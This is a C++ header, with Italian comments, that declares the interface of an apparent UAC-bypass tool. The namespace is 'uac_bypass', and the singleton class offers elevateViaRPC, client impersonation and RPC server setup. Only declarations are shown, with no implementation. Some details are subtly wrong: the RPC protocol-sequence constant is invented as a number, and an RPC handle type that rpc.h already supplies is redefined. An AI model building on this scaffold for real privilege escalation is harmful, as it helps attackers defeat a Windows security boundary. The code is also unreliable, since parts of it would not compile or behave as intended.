#ifndef UAC_BYPASS_RPC_ELEVATION_H
#define UAC_BYPASS_RPC_ELEVATION_H

#include <windows.h>
#include <rpc.h>
#include <rpcdce.h>

// Costanti RPC
#ifndef RPC_C_PROTSEQ_NCALRPC
#define RPC_C_PROTSEQ_NCALRPC 0x04
#endif
#include <string>
#include <vector>
#include "Logger.h"
#include "Config.h"

namespace uac_bypass {

// Forward declarations
typedef void* RPC_IF_HANDLE;

// Struttura per i dettagli dell'endpoint RPC
struct RPCEndpoint {
    std::wstring protocol;
    std::wstring endpoint;
    std::wstring interface_name;
    RPC_IF_HANDLE if_handle;
    bool is_secure;
    bool is_authenticated;
};

// Struttura per il contesto RPC
struct RPCContext {
    unsigned short* bindingString;
    RPC_BINDING_HANDLE serverBinding;
    RPC_STATUS status;
    bool isConnected;
    bool isElevated;
};

// Struttura per le credenziali RPC
struct RPCCredentials {
    std::wstring username;
    std::wstring domain;
    RPC_AUTH_IDENTITY_HANDLE authHandle;
    unsigned long authLevel;
    unsigned long authService;
};

class RPCElevation {
public:
    static RPCElevation& getInstance();
    
    // Metodi principali
    bool initialize();
    bool setupEndpoint();
    bool elevateViaRPC();
    bool cleanup();
    
    // Gestione server RPC
    bool startRPCServer();
    bool stopRPCServer();
    bool registerInterface();
    bool unregisterInterface();
    
    // Gestione client RPC
    bool connectToServer();
    bool disconnectFromServer();
    bool callRemoteProcedure();
    bool handleResponse();

private:
    RPCElevation();  // Singleton
    ~RPCElevation();
    
    RPCElevation(const RPCElevation&) = delete;
    RPCElevation& operator=(const RPCElevation&) = delete;

    // Setup RPC
    bool setupSecurity();
    bool setupAuthentication();
    bool setupProtocol();
    bool initializeEndpoint();
    
    // Gestione binding
    bool createBinding();
    bool setBindingSecurityContext();
    bool validateBinding();
    bool cleanupBinding();
    
    // Gestione autenticazione
    bool authenticateClient();
    bool verifyClientCredentials();
    bool impersonateClient();
    bool revertToSelf();
    
    // Protezioni
    bool secureEndpoint();
    bool monitorRPCCalls();
    bool validateRequests();
    bool handleErrors();
    
    // Utility
    bool generateEndpointName();
    bool setAuthenticationLevel(DWORD level);
    bool setImpersonationLevel(DWORD level);
    bool isEndpointAvailable(const std::wstring& endpoint);
    
    // Membri
    Logger& logger;
    bool initialized;
    RPCEndpoint endpoint;
    RPCContext context;
    RPCCredentials credentials;
    std::vector<RPC_BINDING_HANDLE> activeBindings;
    
    // Costanti
    static constexpr DWORD DEFAULT_AUTH_LEVEL = RPC_C_AUTHN_LEVEL_PKT_PRIVACY;
    static constexpr DWORD DEFAULT_IMP_LEVEL = RPC_C_IMP_LEVEL_IMPERSONATE;
    static constexpr DWORD DEFAULT_PROTOCOL = RPC_C_PROTSEQ_NCALRPC;
};

// Macro per elevazione RPC
#define ELEVATE_VIA_RPC() \
    RPCElevation::getInstance().elevateViaRPC()

// Macro per gestione server RPC
#define START_RPC_SERVER() \
    RPCElevation::getInstance().startRPCServer()

} // namespace uac_bypass

#endif // UAC_BYPASS_RPC_ELEVATION_H